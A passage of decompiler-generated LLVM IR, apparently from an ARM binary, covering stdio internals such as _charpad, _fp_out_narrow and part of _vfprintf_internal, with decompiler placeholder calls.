  %v2_10104 = inttoptr i32 %v1_10104 to i32*
  %v3_10104 = load i32, i32* %v2_10104, align 4
  store i32 %v3_10104, i32* %r3.global-to-local, align 4
  %v3_1010c = inttoptr i32 %v0_10104 to i8*
  store i8 48, i8* %v3_1010c, align 1
  %v2_10114 = load i32, i32* @r4, align 4
  %v3_10114 = add i32 %v2_10114, 1
  %v4_10114 = inttoptr i32 %v3_10114 to i8*
  store i8 0, i8* %v4_10114, align 1
  %v0_10118 = load i32, i32* %r3.global-to-local, align 4
  %v1_10118 = load i32, i32* @r4, align 4
  %v2_10118 = add i32 %v1_10118, 20
  %v3_10118 = inttoptr i32 %v2_10118 to i32*
  store i32 %v0_10118, i32* %v3_10118, align 4
  %v0_1011c = load i32, i32* %r3.global-to-local, align 4
  %v1_1011c = load i32, i32* @r4, align 4
  %v2_1011c = add i32 %v1_1011c, 24
  %v3_1011c = inttoptr i32 %v2_1011c to i32*
  store i32 %v0_1011c, i32* %v3_1011c, align 4
  %v0_10120 = load i32, i32* %r3.global-to-local, align 4
  %v1_10120 = load i32, i32* @r4, align 4
  %v2_10120 = add i32 %v1_10120, 28
  %v3_10120 = inttoptr i32 %v2_10120 to i32*
  store i32 %v0_10120, i32* %v3_10120, align 4
  %v0_10124 = load i32, i32* %r3.global-to-local, align 4
  %v1_10124 = load i32, i32* @r4, align 4
  %v2_10124 = add i32 %v1_10124, 16
  %v3_10124 = inttoptr i32 %v2_10124 to i32*
  store i32 %v0_10124, i32* %v3_10124, align 4
  br label %dec_label_pc_10128

dec_label_pc_10128:                               ; preds = %dec_label_pc_100ec, %dec_label_pc_10104
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1012c = load i32, i32* @r4, align 4
  %v2_1012c = add i32 %v1_1012c, 52
  %v3_1012c = inttoptr i32 %v2_1012c to i32*
  store i32 1, i32* %v3_1012c, align 4
  %v0_10130 = call i32 @__stdio_init_mutex()
  store i32 %v0_10130, i32* %r0.global-to-local, align 4
  %v0_10134 = load i32, i32* @r4, align 4
  %v1_10134 = add i32 %v0_10134, 32
  %v2_10134 = inttoptr i32 %v1_10134 to i32*
  %storemerge = load i32, i32* %v2_10134, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_10138 = add i32 %storemerge, 56
  store i32 %v1_10138, i32* @r5, align 4
  %v2_1013c = icmp eq i32 %storemerge, 0
  store i32 %v1_10138, i32* %r0.global-to-local, align 4
  br i1 %v2_1013c, label %dec_label_pc_10138.dec_label_pc_10148_crit_edge, label %dec_label_pc_100ec

dec_label_pc_10138.dec_label_pc_10148_crit_edge:  ; preds = %dec_label_pc_10128
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_22508.331 to i32*), align 4
  br label %dec_label_pc_10148

dec_label_pc_10148:                               ; preds = %dec_label_pc_10138.dec_label_pc_10148_crit_edge, %entry
  %v11_1017013 = phi i32 [ %v1_10138, %dec_label_pc_10138.dec_label_pc_10148_crit_edge ], [ %v1_101386, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10138.dec_label_pc_10148_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_22508.331 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_101684 = icmp eq i32 %storemerge12, 0
  br i1 %v2_101684, label %dec_label_pc_10170, label %dec_label_pc_10154

dec_label_pc_10154:                               ; preds = %dec_label_pc_10148, %dec_label_pc_10154
  %v0_1015c = phi i32 [ %storemerge1, %dec_label_pc_10154 ], [ %storemerge12, %dec_label_pc_10148 ]
  %v1_10154 = inttoptr i32 %v0_1015c to i8*
  %v2_10154 = load i8, i8* %v1_10154, align 1
  %v3_10154 = zext i8 %v2_10154 to i32
  store i32 %v3_10154, i32* %r3.global-to-local, align 4
  %v1_10158 = and i32 %v3_10154, 64
  store i32 %v0_1015c, i32* %r0.global-to-local, align 4
  store i32 65892, i32* @lr, align 4
  %v1_10160 = icmp ne i32 %v1_10158, 0
  call void @__pseudo_cond_branch(i1 %v1_10160, i32 ptrtoint (i32* @global_var_10184.342 to i32))
  %v0_10164 = load i32, i32* %r4.global-to-local, align 4
  %v1_10164 = add i32 %v0_10164, 32
  %v2_10164 = inttoptr i32 %v1_10164 to i32*
  %storemerge1 = load i32, i32* %v2_10164, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10168 = icmp eq i32 %storemerge1, 0
  br i1 %v2_10168, label %dec_label_pc_10168.dec_label_pc_10170_crit_edge, label %dec_label_pc_10154

dec_label_pc_10168.dec_label_pc_10170_crit_edge:  ; preds = %dec_label_pc_10154
  %v11_10170.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10170

dec_label_pc_10170:                               ; preds = %dec_label_pc_10168.dec_label_pc_10170_crit_edge, %dec_label_pc_10148
  %v11_10170 = phi i32 [ %v11_10170.pre, %dec_label_pc_10168.dec_label_pc_10170_crit_edge ], [ %v11_1017013, %dec_label_pc_10148 ]
  %v2_10170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10170, i32* @r4, align 4
  ret i32 %v11_10170

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10154, { 1, 0 }
  uselistorder label %dec_label_pc_10128, { 1, 0 }
  uselistorder label %dec_label_pc_100ec, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10184 = load i32, i32* @r4, align 4
  store i32 %v3_10184, i32* %stack_var_-8, align 4
  %v0_10188 = load i32, i32* @r0, align 4
  %v1_10188 = add i32 %v0_10188, 8
  %v2_10188 = inttoptr i32 %v1_10188 to i32*
  %v3_10188 = load i32, i32* %v2_10188, align 4
  %v1_1018c = add i32 %v0_10188, 16
  %v2_1018c = inttoptr i32 %v1_1018c to i32*
  %v3_1018c = load i32, i32* %v2_1018c, align 4
  %v9_10190 = icmp eq i32 %v3_1018c, %v3_10188
  store i32 %v0_10188, i32* %r4.global-to-local, align 4
  br i1 %v9_10190, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_10188, i32* %v2_1018c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 65956, i32* @lr, align 4
  %v1_101a0 = xor i1 %v9_10190, true
  call void @__pseudo_cond_branch(i1 %v1_101a0, i32 ptrtoint (i32* @global_var_13d98.343 to i32))
  %v0_101a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_101a4 = add i32 %v0_101a4, 8
  %v2_101a4 = inttoptr i32 %v1_101a4 to i32*
  %v3_101a4 = load i32, i32* %v2_101a4, align 4
  %v1_101a8 = add i32 %v0_101a4, 16
  %v2_101a8 = inttoptr i32 %v1_101a8 to i32*
  %v3_101a8 = load i32, i32* %v2_101a8, align 4
  %v2_101ac = sub i32 %v3_101a8, %v3_101a4
  %v2_101b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_101b0, i32* @r4, align 4
  ret i32 %v2_101ac

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_101b4 = load i32, i32* @r4, align 4
  %v6_101b4 = load i32, i32* @r5, align 4
  %v9_101b4 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_101d42 = icmp eq i32 %arg3, 0
  %v2_101d8 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_101d42, label %dec_label_pc_101f4, label %dec_label_pc_101e8

dec_label_pc_101d0:                               ; preds = %dec_label_pc_101e8
  %v1_101d0 = add i32 %v0_101d0, -1
  store i32 %v1_101d0, i32* @r4, align 4
  %v2_101d4 = icmp eq i32 %v1_101d0, 0
  %v0_101e0 = load i32, i32* @r6, align 4
  br i1 %v2_101d4, label %dec_label_pc_101f4.loopexit, label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %entry, %dec_label_pc_101d0
  %v0_101e04 = phi i32 [ %v0_101e0, %dec_label_pc_101d0 ], [ %arg1, %entry ]
  %v3_101e8 = call i32 @__stdio_fwrite(i32 %v2_101d8, i32 1, i32 %v0_101e04)
  %v7_101ec = icmp eq i32 %v3_101e8, 1
  %v0_101d0 = load i32, i32* @r4, align 4
  br i1 %v7_101ec, label %dec_label_pc_101d0, label %dec_label_pc_101f4.loopexit

dec_label_pc_101f4.loopexit:                      ; preds = %dec_label_pc_101d0, %dec_label_pc_101e8
  %v0_101f4.ph = phi i32 [ %v0_101d0, %dec_label_pc_101e8 ], [ 0, %dec_label_pc_101d0 ]
  %v1_101f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101f4.loopexit, %entry
  %v1_101f4 = phi i32 [ 0, %entry ], [ %v1_101f4.pre, %dec_label_pc_101f4.loopexit ]
  %v0_101f4 = phi i32 [ 0, %entry ], [ %v0_101f4.ph, %dec_label_pc_101f4.loopexit ]
  %v2_101f4 = sub i32 %v1_101f4, %v0_101f4
  store i32 %v3_101b4, i32* @r4, align 4
  store i32 %v6_101b4, i32* @r5, align 4
  store i32 %v9_101b4, i32* @r6, align 4
  ret i32 %v2_101f4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_101f4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_101e8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10200 = load i32, i32* @r4, align 4
  store i32 %v3_10200, i32* %stack_var_-24, align 4
  %v9_10200 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_10208 = and i32 %arg2, 128
  %v2_10208 = icmp eq i32 %v1_10208, 0
  %v0_1020c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1020c, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_10208, label %bb, label %dec_label_pc_10220

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10220:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10224 = call i32 @strlen(i8* %arg4)
  store i32 %v3_10224, i32* %r0.global-to-local, align 4
  %v1_10228 = load i32, i32* %r4.global-to-local, align 4
  %v2_10228 = sub i32 %v1_10228, %v3_10224
  store i32 %v2_10228, i32* @r4, align 4
  store i32 %v3_10224, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_10228, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_10240

.thread:                                          ; preds = %dec_label_pc_10220
  store i32 %v3_10224, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10240:                               ; preds = %dec_label_pc_10220
  %v0_10240 = load i32, i32* @r6, align 4
  %v1_10240 = urem i32 %v0_10240, 128
  %v0_10244 = load i32, i32* @r8, align 4
  store i32 %v0_10244, i32* %r0.global-to-local, align 4
  %v3_1024c = trunc i32 %v1_10240 to i8
  %v4_1024c = call i32 @_charpad(i32 %v0_10244, i8 %v3_1024c, i32 %v2_10228)
  store i32 %v4_1024c, i32* %r0.global-to-local, align 4
  %v1_10250 = load i32, i32* @r4, align 4
  %v9_10250 = icmp eq i32 %v4_1024c, %v1_10250
  store i32 %v4_1024c, i32* %r6.global-to-local, align 4
  br i1 %v9_10250, label %dec_label_pc_1025c, label %dec_label_pc_1027c

dec_label_pc_1025c:                               ; preds = %dec_label_pc_10240
  %v0_1025c = load i32, i32* @r5, align 4
  store i32 %v0_1025c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10260:                               ; preds = %bb, %.thread, %dec_label_pc_1025c
  %v5_1026c = phi i32 [ %v0_1025c, %dec_label_pc_1025c ], [ %arg3, %bb ], [ %v3_10224, %.thread ]
  %tmp17 = icmp slt i32 %v5_1026c, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_10260
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_10260
  %v5_10268 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_10268, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_13e54.344 to i32))
  %v0_10278 = load i32, i32* %r6.global-to-local, align 4
  %v2_10278 = add i32 %storemerge, %v0_10278
  store i32 %v2_10278, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10240, %bb19
  %v0_1027c = phi i32 [ %v4_1024c, %dec_label_pc_10240 ], [ %v2_10278, %bb19 ]
  store i32 %v0_1027c, i32* %r0.global-to-local, align 4
  %v2_10280 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10280, i32* %r4.global-to-local, align 4
  store i32 %v9_10200, i32* %r6.global-to-local, align 4
  ret i32 %v0_1027c

; uselistorder directives
  uselistorder i32 %v0_1027c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1027c, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_10260, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10284 = load i32, i32* @r4, align 4
  store i32 %v3_10284, i32* %stack_var_-36, align 4
  %v6_10284 = load i32, i32* @r5, align 4
  %v15_10284 = load i32, i32* @r8, align 4
  %v18_10284 = load i32, i32* @sb, align 4
  %v21_10284 = load i32, i32* @sl, align 4
  %v24_10284 = load i32, i32* @fp, align 4
  %v2_1028c = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_1028c, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_1028c, i32* %r0.global-to-local, align 4
  %v0_10298 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10298, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_102a0 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_102a0, i32* %r0.global-to-local, align 4
  %v1_102a4 = icmp slt i32 %v2_102a0, 0
  br i1 %v1_102a4, label %dec_label_pc_102ac, label %dec_label_pc_102e0

dec_label_pc_102ac:                               ; preds = %entry
  %v3_102ac = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_102ac, i32* @r4, align 4
  %v1_102b0 = inttoptr i32 %v3_102ac to i8*
  store i32 %v3_102ac, i32* %r0.global-to-local, align 4
  %v3_102b4 = call i32 @strlen(i8* %v1_102b0)
  store i32 %v3_102b4, i32* %r0.global-to-local, align 4
  %v2_102b8 = icmp eq i32 %v3_102b4, 0
  br i1 %v2_102b8, label %bb, label %dec_label_pc_102c8

bb:                                               ; preds = %dec_label_pc_102ac
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10858

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102ac
  %v0_102c8 = load i32, i32* @r4, align 4
  store i32 %v0_102c8, i32* %r0.global-to-local, align 4
  %v0_102cc = load i32, i32* @fp, align 4
  store i32 %v0_102cc, i32* %r2.global-to-local, align 4
  %v3_102d0 = call i32 @__stdio_fwrite(i32 %v0_102c8, i32 %v3_102b4, i32 %v0_102cc)
  store i32 %v3_102d0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10858

dec_label_pc_102e0:                               ; preds = %entry
  store i32 %v2_1028c, i32* %r0.global-to-local, align 4
  %v0_102e4 = load i32, i32* @r5, align 4
  %v2_102e8 = call i32 @_ppfs_prepargs(i32 %v2_1028c, i32 %v0_102e4)
  store i32 %v2_102e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_10388 = zext i8 %tmp104 to i32
  %v2_10390 = ptrtoint i32* %stack_var_-252 to i32
  %v2_103b0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_103c8 = icmp eq i32 %tmp102, 0
  %v1_103dc = inttoptr i32 %tmp101 to i32*
  %v2_106cc = ptrtoint i32* %stack_var_-180 to i32
  %v2_105e8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_105fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10598 = add i32 %tmp101, 4
  %v4_10598 = inttoptr i32 %v3_10598 to i32*
  %v2_1059c = ptrtoint i32* %stack_var_-328 to i32
  %v7_1045c = zext i8 %tmp99 to i32
  %v2_10498 = ptrtoint i32* %stack_var_-53 to i32
  %v5_104a0 = bitcast i32* %stack_var_-53 to i8*
  %v2_104a8 = icmp ugt i32 %tmp102, 4
  %v7_104a8 = icmp eq i32 %tmp102, 5
  %v0_10840.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_103c0187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_105bc = icmp ugt i32 %tmp102, 16
  %v7_105bc = icmp eq i32 %tmp102, 17
  %v2_105c0 = xor i1 %v7_105bc, true
  %v3_105c0 = and i1 %v2_105bc, %v2_105c0
  %v2_1065c = icmp ugt i32 %tmp102, 18
  %v7_1065c = icmp eq i32 %tmp102, 19
  %v2_10660 = xor i1 %v7_1065c, true
  %v3_10660 = and i1 %v2_1065c, %v2_10660
  %v7_106c0 = icmp eq i32 %tmp102, 20
  %v2_10400 = add i32 %tmp102, ptrtoint (i32* @global_var_19310.346 to i32)
  %v1_10404 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_19310.346 to i32), i32 -1)
  %v2_10404 = inttoptr i32 %v1_10404 to i8*
  %v2_10430 = xor i1 %v7_104a8, true
  %v3_10430 = and i1 %v2_104a8, %v2_10430
  %v7_10464 = icmp eq i32 %tmp102, 1
  %v2_104b0 = xor i1 %v2_104a8, true
  %v3_104b0 = or i1 %v7_104a8, %v2_104b0
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_10518 = icmp eq i32 %tmp102, 3
  %v11_10524 = icmp eq i32 %tmp102, 4
  %v9_10394 = mul nuw nsw i32 %v4_10388, 8
  %v10_10394 = add nsw i32 %v9_10394, -8
  %v6_1039c = add i32 %v10_10394, %v2_10390
  br label %dec_label_pc_10840

bb126:                                            ; preds = %dec_label_pc_102f8.outer, %.thread7
  %v2_102f8185 = phi i8 [ %v2_102f8, %.thread7 ], [ %v2_102f8181, %dec_label_pc_102f8.outer ]
  %v1_1030c184 = phi i32 [ %v2_1030c, %.thread7 ], [ %v0_102f849, %dec_label_pc_102f8.outer ]
  %v8_10300 = icmp eq i8 %v2_102f8185, 37
  br i1 %v8_10300, label %dec_label_pc_10314, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1030c = add i32 %v1_1030c184, 1
  store i32 %v2_1030c, i32* @r4, align 4
  %v1_102f8 = inttoptr i32 %v2_1030c to i8*
  %v2_102f8 = load i8, i8* %v1_102f8, align 1
  %v3_102f8 = zext i8 %v2_102f8 to i32
  store i32 %v3_102f8, i32* %r3.global-to-local, align 4
  %v2_102fc = icmp eq i8 %v2_102f8, 0
  br i1 %v2_102fc, label %dec_label_pc_10314, label %bb126

dec_label_pc_10314:                               ; preds = %bb126, %.thread7, %dec_label_pc_102f8.outer
  %v1_1030c.lcssa = phi i32 [ %v0_102f849, %dec_label_pc_102f8.outer ], [ %v2_1030c, %.thread7 ], [ %v1_1030c184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10314 = sub i32 %v1_1030c.lcssa, %v5_10324
  %v9_10314 = icmp eq i32 %v1_1030c.lcssa, %v5_10324
  br i1 %v9_10314, label %dec_label_pc_10348, label %dec_label_pc_1031c

dec_label_pc_1031c:                               ; preds = %dec_label_pc_10314
  store i32 %v2_10314, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_10314, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_1031c
  store i32 %v5_10324, i32* %r0.global-to-local, align 4
  %v5_1032c = load i32, i32* @fp, align 4
  store i32 %v5_1032c, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_1031c, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_1031c ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_13e54.344 to i32))
  %v0_10334 = load i32, i32* %r0.global-to-local, align 4
  %v1_10334 = load i32, i32* @r5, align 4
  %v9_10334 = icmp eq i32 %v0_10334, %v1_10334
  br i1 %v9_10334, label %dec_label_pc_1033c, label %dec_label_pc_10850

dec_label_pc_1033c:                               ; preds = %bb130
  %v2_10340 = add i32 %v0_10334, %stack_var_-336.1.ph
  %v0_10348.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10348

dec_label_pc_10348:                               ; preds = %dec_label_pc_10314, %dec_label_pc_1033c
  %v0_1035c = phi i32 [ %v5_10324, %dec_label_pc_10314 ], [ %v0_10348.pre, %dec_label_pc_1033c ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_10314 ], [ %v2_10340, %dec_label_pc_1033c ]
  %v1_10348 = inttoptr i32 %v0_1035c to i8*
  %v2_10348 = load i8, i8* %v1_10348, align 1
  %v3_10348 = zext i8 %v2_10348 to i32
  store i32 %v3_10348, i32* %r3.global-to-local, align 4
  %v2_1034c = icmp eq i8 %v2_10348, 0
  br i1 %v2_1034c, label %dec_label_pc_10858, label %dec_label_pc_10354

dec_label_pc_10354:                               ; preds = %dec_label_pc_10348
  %v1_10354 = add i32 %v0_1035c, 1
  %v2_10354 = inttoptr i32 %v1_10354 to i8*
  %v3_10354 = load i8, i8* %v2_10354, align 1
  %v4_10354 = zext i8 %v3_10354 to i32
  store i32 %v4_10354, i32* %r3.global-to-local, align 4
  %v7_10358 = icmp eq i8 %v3_10354, 37
  store i32 %v1_10354, i32* %r2.global-to-local, align 4
  br i1 %v7_10358, label %dec_label_pc_10848, label %dec_label_pc_10364

dec_label_pc_10364:                               ; preds = %dec_label_pc_10354
  store i32 %v2_1028c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_1028c, i32* %r0.global-to-local, align 4
  store i32 %v1_10354, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10378 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_1028c, i32* @r0, align 4
  %v0_10380 = call i32 @_ppfs_setargs()
  store i32 %v0_10380, i32* %r0.global-to-local, align 4
  store i32 %v4_10388, i32* @ip, align 4
  store i32 %v2_10390, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_10364
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_10364
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_1039c, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_103a878 = phi i32 [ %v6_1039c, %bb133 ], [ %v2_10390, %.thread ]
  store i32 %v2_103b0, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_103c0187, label %dec_label_pc_103a8, label %dec_label_pc_103c4

dec_label_pc_103a8:                               ; preds = %bb134, %dec_label_pc_103a8
  %v5_103b8189 = phi i32 [ %v5_103b8, %dec_label_pc_103a8 ], [ %v2_103b0, %bb134 ]
  %v0_103a8188 = phi i32 [ %v1_103ac, %dec_label_pc_103a8 ], [ %v0_103a878, %bb134 ]
  %v2_103a8 = add i32 %v5_103b8189, -4
  %v3_103a8 = inttoptr i32 %v2_103a8 to i32*
  store i32 %v0_103a8188, i32* %v3_103a8, align 4
  %v0_103ac = load i32, i32* %r3.global-to-local, align 4
  %v1_103ac = add i32 %v0_103ac, 8
  store i32 %v1_103ac, i32* %r3.global-to-local, align 4
  %v0_103b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_103b4.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_103b0, i32* @lr, align 4
  %v4_103b8 = mul i32 %v0_103b4.pre, 4
  %v5_103b8 = add i32 %v4_103b8, %v2_103b0
  %v1_103bc = add i32 %v0_103b4.pre, 1
  store i32 %v1_103bc, i32* %r2.global-to-local, align 4
  %v5_103c0 = icmp slt i32 %v0_103b4.pre, %v1_103b4.pre
  br i1 %v5_103c0, label %dec_label_pc_103a8, label %dec_label_pc_103c4

dec_label_pc_103c4:                               ; preds = %dec_label_pc_103a8, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_103c8, label %dec_label_pc_103d0, label %dec_label_pc_103f4

dec_label_pc_103d0:                               ; preds = %dec_label_pc_103c4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_103dc = load i32, i32* %v1_103dc, align 4
  store i32 %v2_103dc, i32* %r0.global-to-local, align 4
  %v1_103e0 = and i32 %v0_10424, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_103e8 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_103e8, i32* %r3.global-to-local, align 4
  %v4_103ec = inttoptr i32 %v2_103dc to i8*
  %v5_103ec = call i32 @_store_inttype(i8* %v4_103ec, i32 %v1_103e0, i32 %stack_var_-336.2, i32 %v3_103e8)
  store i32 %v5_103ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1083c

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103c4
  br i1 %tmp195, label %dec_label_pc_10580, label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103f4
  store i32 %v2_10400, i32* %r3.global-to-local, align 4
  %v3_10404 = load i8, i8* %v2_10404, align 1
  %v4_10404 = zext i8 %v3_10404 to i32
  store i32 %v4_10404, i32* @r4, align 4
  %v7_10408 = icmp eq i8 %v3_10404, 10
  br i1 %v7_10408, label %dec_label_pc_10414, label %bb135

bb135:                                            ; preds = %dec_label_pc_103fc
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_10414:                               ; preds = %dec_label_pc_103fc
  store i32 %v0_10424, i32* %r3.global-to-local, align 4
  %v1_10418 = and i32 %v0_10424, 32
  %v2_10418 = icmp eq i32 %v1_10418, 0
  %.175 = select i1 %v2_10418, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_10424 = and i32 %v0_10424, 64
  %v2_10424 = icmp eq i32 %v1_10424, 0
  br i1 %v2_10424, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_10414
  %.176 = select i1 %v2_10418, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_10414, %bb138
  br i1 %v3_10430, label %.thread84, label %dec_label_pc_10438

.thread84:                                        ; preds = %bb139
  %v5_10430 = sub nsw i32 0, %v4_10404
  store i32 %v5_10430, i32* @r4, align 4
